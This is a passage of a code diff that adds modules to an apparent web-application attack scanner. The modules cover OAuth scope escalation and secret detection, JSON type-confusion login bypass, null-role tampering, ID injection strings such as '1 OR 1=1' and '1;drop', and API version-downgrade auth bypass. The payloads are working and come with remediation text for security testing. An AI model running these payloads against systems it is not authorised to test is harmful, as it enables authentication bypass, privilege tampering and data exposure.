+                    f"URL: {no_pkce_url}\nServer presented login form without requiring PKCE",
+                    no_pkce_url, True,
+                    "Enforce PKCE (code_challenge + code_challenge_method=S256) for all public clients. "
+                    "Reject authorization requests without code_challenge from public client_ids. "
+                    "See RFC 7636 and RFC 9700.",
+                    confidence="medium")
+    except httpx.HTTPError:
+        pass
+
+    # ── Test 3: Scope escalation attempt ─────────────────────────────────────
+    escalation_scopes = ["admin", "write:all", "read:all", "sudo", "openid profile email admin"]
+    for scope in escalation_scopes[:3]:
+        esc_url = (f"{oauth_base}?response_type=code&client_id=test"
+                   f"&redirect_uri={origin}/callback&scope={scope}&state=xyz")
+        yield _probe("oauth_advanced", "GET", esc_url, payload=f"scope={scope}",
+                     note="scope escalation attempt")
+        try:
+            r = await client.get(esc_url, timeout=8, follow_redirects=False)
+            yield _probe("oauth_advanced", "GET", esc_url, status=r.status_code, size=len(r.content))
+            if r.status_code in (200, 302) and "error" not in r.text.lower()[:200]:
+                yield _finding("oauth_advanced", "oauth_scope_escalation", "high",
+                    f"OAuth Scope Escalation — '{scope}' Scope Not Rejected",
+                    f"The authorization server accepted a request for elevated scope `{scope}` "
+                    f"without returning an error. Depending on the authorization server's behaviour, "
+                    f"this could allow an attacker to obtain tokens with broader permissions than "
+                    f"intended, potentially including admin or write access.",
+                    f"URL: {esc_url}\nRequested scope: {scope}\nResponse: {r.status_code}",
+                    esc_url, True,
+                    "Validate all requested scopes against the client's pre-registered allowed scopes. "
+                    "Return `invalid_scope` error for any unauthorized scope request. "
+                    "Never grant more permissions than the client is registered to request.",
+                    confidence="medium")
+                break
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    # ── Test 4: Client secret / token in JavaScript ───────────────────────────
+    try:
+        r = await client.get(target, timeout=8)
+        # Look for OAuth client secrets or access tokens hardcoded in JS
+        oauth_secret_patterns = [
+            r'client_secret\s*[:=]\s*["\']([^"\']{10,})["\']',
+            r'clientSecret\s*[:=]\s*["\']([^"\']{10,})["\']',
+            r'access_token\s*[:=]\s*["\']([A-Za-z0-9\-_\.]{20,})["\']',
+            r'"client_secret"\s*:\s*"([^"]{10,})"',
+        ]
+        for pat in oauth_secret_patterns:
+            m = re.search(pat, r.text, re.IGNORECASE)
+            if m:
+                val = m.group(1)
+                # Don't flag obviously templated or placeholder values
+                if not any(p in val.lower() for p in ["your_", "example", "placeholder", "xxx"]):
+                    yield _finding("oauth_advanced", "oauth_client_secret_in_js", "critical",
+                        "OAuth Client Secret / Access Token Hardcoded in Frontend JavaScript",
+                        f"A potential OAuth client_secret or access_token was found hardcoded in the "
+                        f"page source: `{val[:30]}...`. Client secrets must never be embedded in "
+                        f"frontend JavaScript — they are visible to any user who views source.",
+                        f"Pattern matched: {pat}\nValue (truncated): {val[:40]}",
+                        target, True,
+                        "Move all OAuth secrets to the server side. "
+                        "Use the Authorization Code flow with PKCE for SPAs (no client_secret needed). "
+                        "Rotate the exposed secret immediately.",
+                        confidence="high")
+                    break
+    except httpx.HTTPError:
+        pass
+
+
+# ── Module: JSON Type Confusion ───────────────────────────────────────────────
+
+async def _module_type_confusion(target: str, client: httpx.AsyncClient,
+                                  forms: list[dict]) -> AsyncGenerator[dict, None]:
+    """
+    JSON type juggling / type confusion attacks:
+    - Array injection bypassing string equality checks
+    - Null coercion bypassing presence checks
+    - Integer vs string coercion in auth flows
+    - Object injection in JSON POST bodies
+
+    Common in Node.js (loose == comparisons), PHP (strcmp returns 0 for non-string),
+    and Ruby (JSON.parse returns different types from expected).
+    """
+    # Endpoints that commonly receive JSON with auth/id fields
+    auth_endpoints = [
+        "/api/login", "/api/auth/login", "/auth/login", "/login",
+        "/api/users", "/api/me", "/api/profile",
+        "/api/admin", "/api/v1/login", "/api/v2/login",
+    ]
+
+    # ── Test 1: Array injection in login ─────────────────────────────────────
+    # PHP strcmp(password, ['x']) = null which coerces to 0 (true in loose comparison)
+    # Node.js: "admin" == ["admin"] is false, but some ORMs handle arrays as IN queries
+    array_payloads = [
+        {"username": "admin", "password": ["x"]},
+        {"username": ["admin"], "password": "x"},
+        {"email": ["admin@example.com"], "password": "x"},
+        {"email": "admin@example.com", "password": {"$ne": ""}},  # NoSQL + type confusion combo
+    ]
+
+    for ep in auth_endpoints[:5]:
+        url = target + ep
+        yield _probe("type_confusion", "POST", url, note="array/object type injection in auth body")
+        for payload_dict in array_payloads[:2]:
+            try:
+                r = await client.post(url, json=payload_dict, timeout=8)
+                yield _probe("type_confusion", "POST", url, status=r.status_code,
+                             size=len(r.content), payload=str(payload_dict)[:60])
+                # Success signals: token in response, redirect to dashboard, 200 with user data
+                if r.status_code in (200, 201):
+                    body_lower = r.text.lower()
+                    if any(kw in body_lower for kw in
+                           ["token", "access_token", "dashboard", "welcome", "user", "profile"]):
+                        yield _finding("type_confusion", "array_injection_auth_bypass", "critical",
+                            "JSON Type Confusion — Array Injection Bypasses Authentication",
+                            f"Sending `password` as an array `{payload_dict.get('password')}` "
+                            f"to `{ep}` returned {r.status_code} with authentication success signals. "
+                            f"In PHP, `strcmp(password, [])` returns NULL which loose-equals 0 (truthy). "
+                            f"In some ORMs, an array is treated as an IN query, matching any user.",
+                            f"URL: {url}\nPayload: {payload_dict}\nResponse: {r.status_code}\n"
+                            f"Body: {r.text[:300]}",
+                            url, True,
+                            "Use strict type checking (=== in PHP, strict comparison in JS). "
+                            "Validate all input types before passing to authentication functions. "
+                            "Use parameterized queries — never concatenate user input into auth logic.",
+                            confidence="high")
+                        break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # ── Test 2: Null / empty type coercion in JSON ─────────────────────────────
+    # Some apps check `if (user.role)` — null, false, 0 can bypass presence check
+    api_endpoints = ["/api/users/me", "/api/profile", "/api/admin/users"]
+    for ep in api_endpoints[:3]:
+        url = target + ep
+        for null_payload in [{"role": None}, {"admin": None}, {"is_admin": None}]:
+            try:
+                r_normal = await client.get(url, timeout=6)
+                r_null   = await client.patch(url, json=null_payload, timeout=6)
+                yield _probe("type_confusion", "PATCH", url, status=r_null.status_code,
+                             payload=str(null_payload), note="null coercion in role field")
+                if r_null.status_code in (200, 204):
+                    yield _finding("type_confusion", "null_role_coercion", "high",
+                        f"JSON Null Coercion — Role/Admin Field Set to null Accepted",
+                        f"PATCH `{ep}` with `{null_payload}` returned {r_null.status_code}. "
+                        f"If the server stores null for role and then checks `if user.role` (truthy check), "
+                        f"the user could gain or lose permissions unexpectedly. "
+                        f"Some implementations treat null role as a superuser (no restrictions applied).",
+                        f"URL: {url}\nPayload: {null_payload}\nResponse: {r_null.status_code}",
+                        url, True,
+                        "Use strict type validation for all role/permission fields. "
+                        "Never use truthy checks for authorization — compare against explicit allowed values. "
+                        "Reject requests that set role/admin/permission fields to null.",
+                        confidence="medium")
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # ── Test 3: Integer user ID as string vs integer ──────────────────────────
+    # Loose comparison: "1" == 1 in PHP, causing "user_id: '1admin'" to match user 1
+    string_id_payloads = ["1 OR 1=1", "1e0", "01", "1.0", "1;drop"]
+    for ep_pattern in ["/api/users/{id}", "/api/profile/{id}", "/api/orders/{id}"]:
+        for sid in string_id_payloads[:2]:
+            ep = ep_pattern.replace("{id}", sid)
+            url = target + ep
+            yield _probe("type_confusion", "GET", url, payload=sid,
+                         note="string/integer type confusion in path param")
+            try:
+                r = await client.get(url, timeout=6)
+                yield _probe("type_confusion", "GET", url, status=r.status_code, size=len(r.content))
+                if r.status_code == 200 and len(r.content) > 50:
+                    yield _finding("type_confusion", "integer_string_confusion", "medium",
+                        f"Possible Integer/String Type Confusion in Path Parameter",
+                        f"GET `{url}` with non-integer ID `{sid}` returned 200 ({len(r.content)}b). "
+                        f"In PHP, loose comparison `$id == '01'` is true for integer 1. "
+                        f"In JavaScript, `'1e0' == 1` evaluates to true. "
+                        f"This may allow unauthorized resource access or data corruption.",
+                        f"URL: {url}\nID type: string '{sid}'\nResponse: 200 ({len(r.content)}b)",
+                        url, True,
+                        "Cast all ID parameters to the expected type before use. "
+                        "Use === (strict equality) in JavaScript and cast to int in PHP. "
+                        "Validate IDs match the expected format (UUID, integer) before querying.",
+                        confidence="medium")
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+
+# ── Module: API Version Downgrade ─────────────────────────────────────────────
+
+async def _module_api_versioning(target: str, client: httpx.AsyncClient,
+                                  endpoints: set[str]) -> AsyncGenerator[dict, None]:
+    """
+    API versioning security issues:
+    - Older API versions with relaxed authentication
+    - Missing authorization on deprecated version endpoints
+    - Version enumeration via Accept header, URL path, query param
+    - Different behavior between v1 and v2 (auth bypass via downgrade)
+    """
+    parsed = urlparse(target)
+
+    # Detect current API version from crawled endpoints or common patterns
+    current_versions: list[str] = []
+    for ep in list(endpoints)[:50]:
+        m = re.search(r'/v(\d+)/', ep)
+        if m:
+            ver = m.group(1)
+            if ver not in current_versions:
+                current_versions.append(ver)
+
+    # Generate versions to probe: if current is v2, probe v1; if v3, probe v1+v2
+    versions_to_test = [str(v) for v in range(1, 5)]
+
+    # ── Test 1: Probe alternative API version prefixes ──────────────────────
+    version_prefixes = []
+    for v in versions_to_test:
+        version_prefixes.extend([
+            f"/api/v{v}/", f"/v{v}/", f"/api/{v}/",
+        ])
+
+    discovered_versions: list[str] = []
+    for prefix in version_prefixes[:12]:
+        url = target + prefix.rstrip("/")
+        yield _probe("api_versioning", "GET", url, note=f"probing API version endpoint: {prefix}")
+        try:
+            r = await client.get(url, timeout=6)
+            yield _probe("api_versioning", "GET", url, status=r.status_code, size=len(r.content))
+            if r.status_code not in (404, 400, 410):
+                discovered_versions.append(prefix)
+        except httpx.HTTPError:
+            pass
+        await asyncio.sleep(0)
+
+    if len(discovered_versions) > 1:
+        yield _finding("api_versioning", "multiple_api_versions_active", "medium",
+            "Multiple API Versions Active — Attack Surface Increased",
+            f"Multiple API version prefixes returned non-404 responses: {discovered_versions}. "
+            f"Older versions often have weaker security controls, missing authentication, "
+            f"or lack rate limiting applied to newer versions. This significantly expands "
+            f"the attack surface for authentication bypass and privilege escalation.",
+            f"Active versions found: {discovered_versions}",
+            target, False,
+            "Decommission all unused API versions. Enforce identical security controls "
+            "across all active versions. Add deprecation warnings and sunset dates.",
+            confidence="high")
+
+    # ── Test 2: Auth bypass via version downgrade ─────────────────────────────
+    # Check if an authenticated endpoint on v2 is accessible without auth on v1
+    protected_paths = [
+        "users", "profile", "me", "admin", "settings",
+        "accounts", "dashboard", "orders",
+    ]
+    for prefix in discovered_versions[:3]:
+        for path in protected_paths[:5]:
+            url_auth   = f"{target}{prefix}{path}"
+            yield _probe("api_versioning", "GET", url_auth, note="auth check on this version")
+            try:
+                # Test without auth header (strip Authorization)
+                r_no_auth = await client.get(
+                    url_auth,
+                    headers={k: v for k, v in client.headers.items()
+                              if k.lower() not in ("authorization", "cookie")},
+                    timeout=6
+                )
+                yield _probe("api_versioning", "GET", url_auth,
+                             status=r_no_auth.status_code, size=len(r_no_auth.content))
+                if (r_no_auth.status_code == 200 and len(r_no_auth.content) > 100
+                        and "application/json" in r_no_auth.headers.get("content-type", "")):
+                    yield _finding("api_versioning", "auth_bypass_old_version", "critical",
+                        f"Auth Bypass — Unauthenticated Access to `{prefix}{path}`",
+                        f"The endpoint `{url_auth}` returned 200 with JSON data when called "
+                        f"without an Authorization header. Older API versions frequently lack "
+                        f"authentication middleware that was added in later versions. "
+                        f"This is a critical finding: full data access without credentials.",
+                        f"URL: {url_auth}\nNo-auth response: {r_no_auth.status_code} "
+                        f"({len(r_no_auth.content)}b JSON)\nSnippet: {r_no_auth.text[:300]}",
+                        url_auth, True,
+                        "Apply authentication middleware to ALL API versions, not just the latest. "
+                        "Decommission or restrict deprecated versions behind feature flags. "
+                        "Audit every endpoint across every active version for auth gaps.",
+                        confidence="high")
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+    # ── Test 3: Version enumeration via Accept header ─────────────────────────
+    # Some APIs version via `Accept: application/vnd.company.v1+json`
+    if endpoints:
+        test_ep = next(iter(endpoints))
+        for v_header in ["application/vnd.api.v1+json", "application/vnd.api.v2+json",
+                         "application/json; version=1", "application/json; version=2"]:
+            try:
+                r = await client.get(test_ep, headers={"Accept": v_header}, timeout=6)
+                yield _probe("api_versioning", "GET", test_ep, payload=f"Accept: {v_header}",
+                             status=r.status_code, size=len(r.content))
+                if r.status_code == 200 and "version" in r.headers.get("content-type", "").lower():
+                    yield _finding("api_versioning", "header_based_versioning", "info",
+                        "Header-Based API Versioning Detected",
+                        f"The API supports version negotiation via the Accept header "
+                        f"(`{v_header}` → {r.status_code}). Header-based versioning should be "
+                        f"tested for version-specific security control gaps.",
+                        f"Accept header: {v_header}\nResponse: {r.status_code}",
+                        test_ep, False,
+                        "Ensure all security controls (auth, rate limiting, input validation) "
+                        "are version-agnostic and applied uniformly.",
+                        confidence="medium")
+                    break
+            except httpx.HTTPError:
+                pass
+            await asyncio.sleep(0)
+
+
 # ── Main Stream ───────────────────────────────────────────────────────────────
 
 async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest, ai_config: dict | None = None) -> AsyncGenerator[str, None]:
@@ -5019,6 +5901,12 @@ async def _stream_attack_suite(scan_id: str, req: AttackSuiteRequest, ai_config:
             "hpp":         lambda: _module_hpp(req.target, client, crawl_result.endpoints),
             "saml":        lambda: _module_saml(req.target, client),
             "websocket":   lambda: _module_websocket(req.target, client),
+            # Principal engineer additions
+            "host_header":    lambda: _module_host_header(req.target, client),
+            "path_traversal": lambda: _module_path_traversal(req.target, client, crawl_result.endpoints),
+            "oauth_advanced": lambda: _module_oauth_advanced(req.target, client),
+            "type_confusion": lambda: _module_type_confusion(req.target, client, crawl_result.forms),
+            "api_versioning": lambda: _module_api_versioning(req.target, client, crawl_result.endpoints),
         }
 
         for mod_id in req.modules:
